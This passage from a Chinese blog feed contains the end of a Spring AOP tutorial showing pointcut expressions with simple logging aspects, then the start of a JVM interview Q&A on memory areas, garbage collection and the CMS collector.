        AnnotationConfigApplicationContext context &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; AnnotationConfigApplicationContext(AopConfig.&lt;span&gt;class&lt;/span&gt;&lt;span&gt;);
        UserService userService &lt;/span&gt;= context.getBean(UserService.&lt;span&gt;class&lt;/span&gt;&lt;span&gt;);
        userService.say(&lt;/span&gt;&quot;toby&quot;&lt;span&gt;);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　运行结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1761778/201908/1761778-20190816235325593-618716715.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;② within：&lt;/strong&gt;用于匹配指定类型内的方法执行， within与execution相比，粒度更大，仅能实现到包和接口、类级别。而execution可以精确到方法的返回值，参数个数、修饰符、参数类型等。&lt;/p&gt;
&lt;p&gt;　　定义一个UserAspect：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.toby.aspect;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt; org.aspectj.lang.annotation.*&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.stereotype.Component;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * @desc: 用户切面，该切面一定要交给spring容器管理
 * &lt;/span&gt;&lt;span&gt;@author&lt;/span&gt;&lt;span&gt;: toby
 * @date: 2019/8/5 22:56
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
@Aspect
@Component
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; UserAspect {

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * Limits matching to join points within certain types (the execution of a method declared within a matching type when using Spring AOP).
     * 用于匹配指定类型内的方法执行， within与execution相比，粒度更大，仅能实现到包和接口、类级别。而execution可以精确到方法的返回值，参数个数、修饰符、参数类型等
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    @Pointcut(&lt;/span&gt;&quot;within(com.toby.service.impl.UserServiceImpl)&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; pointCutWithin(){}

    @Before(&lt;/span&gt;&quot;pointCutWithin()&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; before(){
        System.out.println(&lt;/span&gt;&quot;--------before--------&quot;&lt;span&gt;);
    }

    @After(&lt;/span&gt;&quot;pointCutWithin()&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; after(){
        System.out.println(&lt;/span&gt;&quot;--------after--------&quot;&lt;span&gt;);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　运行结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1761778/201908/1761778-20190817000020506-189996212.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;③ this：&lt;/strong&gt;用于匹配当前AOP代理对象类型的执行方法；注意是AOP代理对象的类型匹配 &lt;/p&gt;
&lt;p&gt;　　定义一个UserAspect：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.toby.aspect;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt; org.aspectj.lang.annotation.*&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.stereotype.Component;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * @desc: 用户切面，该切面一定要交给spring容器管理
 * &lt;/span&gt;&lt;span&gt;@author&lt;/span&gt;&lt;span&gt;: toby
 * @date: 2019/8/5 22:56
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
@Aspect
@Component
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; UserAspect {

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * Limits matching to join points (the execution of methods when using Spring AOP) where the bean reference (Spring AOP proxy) is an instance of the given type.
     * 用于匹配当前AOP代理对象类型的执行方法；注意是AOP代理对象的类型匹配
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    @Pointcut(&lt;/span&gt;&quot;this(com.toby.service.impl.UserServiceImpl)&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; pointCutThis(){}

    @Before(&lt;/span&gt;&quot;pointCutThis()&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; before(){
        System.out.println(&lt;/span&gt;&quot;--------before--------&quot;&lt;span&gt;);
    }

    @After(&lt;/span&gt;&quot;pointCutThis()&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; after(){
        System.out.println(&lt;/span&gt;&quot;--------after--------&quot;&lt;span&gt;);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　@EnableAspectJAutoProxy(proxyTargetClass = true)，则用CGLIB代理，而CGLIB继承被代理的类来实现，所以&lt;strong&gt;&lt;span&gt;this&lt;/span&gt;&lt;/strong&gt;能匹配到，运行结果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1761778/201908/1761778-20190817000020506-189996212.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 　　@EnableAspectJAutoProxy，默认proxyTargetClass = false，如果基于接口则用JDK代理，所以&lt;strong&gt;&lt;span&gt;this&lt;/span&gt;&lt;/strong&gt;匹配不到，运行结果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1761778/201908/1761778-20190817000805735-1029819738.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;④ target：&lt;/strong&gt;用于匹配当前目标对象类型的执行方法&lt;/p&gt;
&lt;p&gt;　　定义一个UserAspect：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.toby.aspect;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt; org.aspectj.lang.annotation.*&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.stereotype.Component;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * @desc: 用户切面，该切面一定要交给spring容器管理
 * &lt;/span&gt;&lt;span&gt;@author&lt;/span&gt;&lt;span&gt;: toby
 * @date: 2019/8/5 22:56
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
@Aspect
@Component
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; UserAspect {

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * Limits matching to join points (the execution of methods when using Spring AOP) where the target object (application object being proxied) is an instance of the given type.
     * 用于匹配当前目标对象类型的执行方法
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    @Pointcut(&lt;/span&gt;&quot;target(com.toby.service.impl.UserServiceImpl)&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; pointCutTarget(){}

    @Before(&lt;/span&gt;&quot;pointCutTarget()&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; before(){
        System.out.println(&lt;/span&gt;&quot;--------before--------&quot;&lt;span&gt;);
    }

    @After(&lt;/span&gt;&quot;pointCutTarget()&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; after(){
        System.out.println(&lt;/span&gt;&quot;--------after--------&quot;&lt;span&gt;);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　运行结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1761778/201908/1761778-20190817001640572-851771441.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;⑤ args：&lt;/strong&gt;用于匹配当前执行的方法传入的参数为指定类型的执行方法&lt;/p&gt;
&lt;p&gt;　　定义一个UserAspect：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.toby.aspect;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt; org.aspectj.lang.annotation.*&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.stereotype.Component;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * @desc: 用户切面，该切面一定要交给spring容器管理
 * &lt;/span&gt;&lt;span&gt;@author&lt;/span&gt;&lt;span&gt;: toby
 * @date: 2019/8/5 22:56
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
@Aspect
@Component
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; UserAspect {

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * Limits matching to join points (the execution of methods when using Spring AOP) where the arguments are instances of the given types.
     * 用于匹配当前执行的方法传入的参数为指定类型的执行方法
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    @Pointcut(&lt;/span&gt;&quot;args(java.lang.String)&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; pointCutArgs(){}

    @Before(&lt;/span&gt;&quot;pointCutArgs()&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; before(){
        System.out.println(&lt;/span&gt;&quot;--------before--------&quot;&lt;span&gt;);
    }

    @After(&lt;/span&gt;&quot;pointCutArgs()&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; after(){
        System.out.println(&lt;/span&gt;&quot;--------after--------&quot;&lt;span&gt;);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　定义一个启动测试类AopMain：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.toby;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.toby.config.AopConfig;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.toby.service.UserService;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.context.annotation.AnnotationConfigApplicationContext;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * @desc: aop启动类
 * &lt;/span&gt;&lt;span&gt;@author&lt;/span&gt;&lt;span&gt;: toby
 * @date: 2019/8/5 23:50
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; AopMain {
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {
        AnnotationConfigApplicationContext context &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; AnnotationConfigApplicationContext(AopConfig.&lt;span&gt;class&lt;/span&gt;&lt;span&gt;);
        UserService userService &lt;/span&gt;= context.getBean(UserService.&lt;span&gt;class&lt;/span&gt;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;不能被增强&lt;/span&gt;
&lt;span&gt;        userService.add();
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;能被增强 匹配到了参数String类型&lt;/span&gt;
        userService.say(&quot;toby&quot;&lt;span&gt;);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　运行结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1761778/201908/1761778-20190817002158359-1649680351.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;⑥ @target&lt;/strong&gt;：匹配目标对象类型是否有指定的注解&lt;/p&gt;
&lt;p&gt;　　定义目标对象UserServiceImpl如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.toby.service.impl;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.toby.anno.Toby;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.toby.service.UserService;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.stereotype.Service;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * @desc: user业务的实现类
 * &lt;/span&gt;&lt;span&gt;@author&lt;/span&gt;&lt;span&gt;: toby
 * @date: 2019/8/4 23:29
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
@Service
@Toby
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; UserServiceImpl &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; UserService {

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; add() {
        System.out.println(&lt;/span&gt;&quot;执行UserServiceImpl的add方法&quot;&lt;span&gt;);
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String say(String name) {
        System.out.println(&lt;/span&gt;&quot;执行UserServiceImpl的say方法 args = &quot; +&lt;span&gt; name);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &quot;hello &quot; +&lt;span&gt; name;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　定义一个注解Log：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.toby.anno;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.lang.annotation.ElementType;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.lang.annotation.Retention;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.lang.annotation.RetentionPolicy;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.lang.annotation.Target;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * @desc: 日志注解
 * &lt;/span&gt;&lt;span&gt;@author&lt;/span&gt;&lt;span&gt;: toby
 * @date: 2019/8/5 23:06
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
@Target({ElementType.TYPE,ElementType.METHOD})
@Retention(RetentionPolicy.RUNTIME)
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; @&lt;span&gt;interface&lt;/span&gt;&lt;span&gt; Log {
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　定义一个UserAspect：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.toby.aspect;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt; org.aspectj.lang.annotation.*&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.stereotype.Component;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * @desc: 用户切面，该切面一定要交给spring容器管理
 * &lt;/span&gt;&lt;span&gt;@author&lt;/span&gt;&lt;span&gt;: toby
 * @date: 2019/8/5 22:56
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
@Aspect
@Component
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; UserAspect {

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * Limits matching to join points (the execution of methods when using Spring AOP) where the class of the executing object has an annotation of the given type.
     * 用于匹配目标对象类型是否有指定的注解
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    @Pointcut(&lt;/span&gt;&quot;@target(com.toby.anno.Log)&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; pointCutTargetAnno(){}

    @Before(&lt;/span&gt;&quot;pointCutTargetAnno()&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; before(){
        System.out.println(&lt;/span&gt;&quot;--------before--------&quot;&lt;span&gt;);
    }

    @After(&lt;/span&gt;&quot;pointCutTargetAnno()&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; after(){
        System.out.println(&lt;/span&gt;&quot;--------after--------&quot;&lt;span&gt;);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　运行结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1761778/201908/1761778-20190817003402214-1319791588.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　⑦ &lt;strong&gt;@args：&lt;/strong&gt;匹配方法参数所属的类型上有指定的注解（例子略）&lt;/p&gt;
&lt;p&gt;　　⑧ &lt;strong&gt;@within：&lt;/strong&gt;用于匹配所持有指定注解类型内的所以连接点也就是方法（例子略）&lt;/p&gt;
&lt;p&gt;　　⑨ &lt;strong&gt;@annotation：&lt;/strong&gt;用于匹配当前执行方法持有指定注解的方法（注解作用在方法上面）&lt;/p&gt;
&lt;p&gt;　　定义目标对象UserServiceImpl如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.toby.service.impl;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.toby.anno.Log;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.toby.service.UserService;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.stereotype.Service;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * @desc: user业务的实现类
 * &lt;/span&gt;&lt;span&gt;@author&lt;/span&gt;&lt;span&gt;: toby
 * @date: 2019/8/4 23:29
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
@Service
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; UserServiceImpl &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; UserService {

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; add() {
        System.out.println(&lt;/span&gt;&quot;执行UserServiceImpl的add方法&quot;&lt;span&gt;);
    }

    @Override
    @Log
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String say(String name) {
        System.out.println(&lt;/span&gt;&quot;执行UserServiceImpl的say方法 args = &quot; +&lt;span&gt; name);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &quot;hello &quot; +&lt;span&gt; name;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　定义一个UserAspect：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.toby.aspect;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt; org.aspectj.lang.annotation.*&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.stereotype.Component;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * @desc: 用户切面，该切面一定要交给spring容器管理
 * &lt;/span&gt;&lt;span&gt;@author&lt;/span&gt;&lt;span&gt;: toby
 * @date: 2019/8/5 22:56
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
@Aspect
@Component
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; UserAspect {

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * Limits matching to join points where the subject of the join point (the method being executed in Spring AOP) has the given annotation.
     * 用于匹配当前执行方法持有指定注解的方法（注解作用在方法上面）；
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    @Pointcut(&lt;/span&gt;&quot;@annotation(com.toby.anno.Log)&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; pointCutAnno(){}

    @Before(&lt;/span&gt;&quot;pointCutAnno()&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; before(){
        System.out.println(&lt;/span&gt;&quot;--------before--------&quot;&lt;span&gt;);
    }

    @After(&lt;/span&gt;&quot;pointCutAnno()&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; after(){
        System.out.println(&lt;/span&gt;&quot;--------after--------&quot;&lt;span&gt;);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　 &lt;span&gt;运行结果发现：userService.add();//不能被增强 userService.say(&quot;toby&quot;);//能被增强，因为say方法上有@Log注解；&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; 　　总结：本章讲解了Spring AOP的核心概念和应用场景，Spring AOP可以帮我们解决编程过程中的一些横切性问题，比如我们要记录日志，事务管理，性能监控，权限认证等。使的这些问题能和我们业务逻辑分开，达到了解耦的目的，代码的重用性更高。如何声明一个Aspect，声明一个Pointcut以及Spring AOP支持的9种切入点表达式。Spring AOP的代理方式有2种，一个是JDK一个CGLIB，如果配置设置proxyTargetClass=false，或默认为false，则是用JDK代理，否则使用的是CGLIB代理，注意JDK动态代理必须实现接口，否则还是会走CGLIB动态代理。（&lt;strong&gt;&lt;span&gt;后续的源码解析会分析到原因&lt;/span&gt;&lt;/strong&gt;），Spring系列完整代码在码云：&lt;strong&gt;&lt;span&gt;&lt;a href=&quot;https://gitee.com/xutaowin/spring&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;spring系列&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 16 Aug 2019 17:19:00 +0000</pubDate>
<dc:creator>toby.xu</dc:creator>
<og:description>一、AOP是什么 AOP（面向切面编程），可以说是一种编程思想，其中的Spring AOP和AspectJ都是现实了这种编程思想。相对OOP（面向过程编程）来说，提供了另外一种编程方式，对于OOP过程</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/toby-xu/p/11361351.html</dc:identifier>
</item>
<item>
<title>JVM面试十问 - OKevin</title>
<link>http://www.cnblogs.com/yulinfeng/p/11367096.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yulinfeng/p/11367096.html</guid>
<description>&lt;p&gt;&lt;strong&gt;1. JVM运行时划分哪几个区域？哪些区域是线程共享的？哪些区域是线程独占的？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;JVM运行时一共划分：程序计数器、虚拟机栈、堆、本地方法栈、方法区。&lt;/p&gt;
&lt;p&gt;线程共享的数据区域：堆、方法区。&lt;/p&gt;
&lt;p&gt;线程独享的数据区域区域：程序计数器、虚拟机栈、本地方法栈。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 这几个内存区域分别存放什么数据？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;程序计数器记录当前线程执行的位置；&lt;/p&gt;
&lt;p&gt;虚拟机栈存储基本数据类型以及对象的引用等；&lt;/p&gt;
&lt;p&gt;堆存储对象实例；&lt;/p&gt;
&lt;p&gt;本地方法栈与虚拟机栈类似，它为Native方法服务；&lt;/p&gt;
&lt;p&gt;方法区存储被JVM加载的类信息、常量、静态变量等。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. GC回收算法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;(1)标记-清除算法：首先标记出需要回收的对象，标记完成后统一清除。此算法缺点是标记-清楚效率不高，且容易出现大量不连续的碎片空间。&lt;/p&gt;
&lt;p&gt;(2)复制算法：将内存空间划分成两部分，每次只使用一个内存空间部分，当一个内存空间使用完，将会把存活的对象复制到另一空间，然后一次性清理掉该部分空间。此算法缺点是内存利用率较低，只有一半。&lt;/p&gt;
&lt;p&gt;(3)标记-整理算法：和标记-清楚算法相同也是先标记出需要回收的对象，但在标记完成后不是直接清除而是将存活的对象像一侧进行移动，再清除边界之外的内存。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. 这三种GC回收算法在JVM中是如何应用的？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;GC主要发生在JVM的堆内存中，堆内存分为&quot;新生代&quot;和&quot;老年代&quot;，新生代的GC称为&quot;Minor GC&quot;，老年代的GC称为&quot;Major GC&quot;。&lt;/p&gt;
&lt;p&gt;新生代中的GC算法使用复制算法：新生代中分为了Eden区和Survivor区(Survivor from和Survivor to)，新产生的对象实例先在Eden区，Eden区满了过后再在Survivor from区，如果Survivor from区也满了后，将进行Minor GC（复制算法），将存活的对象复制到Survivor to区，此时清除Eden区和Survivor from区，此时Survivor from成为新的Survivor to。新的对象又将在Eden区域进行分配，周而复始。&lt;/p&gt;
&lt;p&gt;老年代中的GC算法使用标记-清除算法/标记-整理算法，视具体的GC回收器而定。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 频繁的Full GC会带来什么问题？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;CPU占用率过高，系统出现卡顿。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 什么是OOM内存溢出，它发生在哪块内存区域&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;OOM通常发生在堆内存上，指的是内存对象没有及时回收，造成没有多余的内存分配给新的对象，此时应该定位程序中是否在频繁创建对象而没有及时回收，或者设置JVM的参数-Xms、-Xmx。&lt;/p&gt;
&lt;p&gt;但OOM还有一种情况发生在虚拟机栈，此时虚拟机栈并不是因为递归太深造成StackOverflow，而是的的确确发生了OOM。首先，虚拟机栈作为线程独享的内存区域，总的虚拟机栈内存大小有限，也就是可分配的线程大小有限，当每个虚拟机栈设置的内存大小过大时，此时可分配的线程大小就变少，继续创建过多的线程可能会导致无法再分配内存空间，造成虚拟机栈的OOM。此时的解决办法时，适当设置虚拟机栈的内存大小-Xss，以便能创建更多的线程。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7.常用的GC回收器有哪些，有什么特点？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;CMS：通常对老年代的对象进行GC，基于标记-清除算法，是一个低停顿、并发收集的GC回收器。它的GC过程一共分为4个步骤：&lt;/p&gt;
&lt;p&gt;①初始标记，标记GC Roots能关联的对象（即存活的对象），会停止用户线程。&lt;/p&gt;
&lt;p&gt;②并发标记，不会停止用户线程，和用户线程一起工作标记可达对象。&lt;/p&gt;
&lt;p&gt;③重新标记，标记因为在“并发标记”阶段新产生的对象。&lt;/p&gt;
&lt;p&gt;④并发清除，同用户线程一起工作，清理需要清理的对象。&lt;/p&gt;
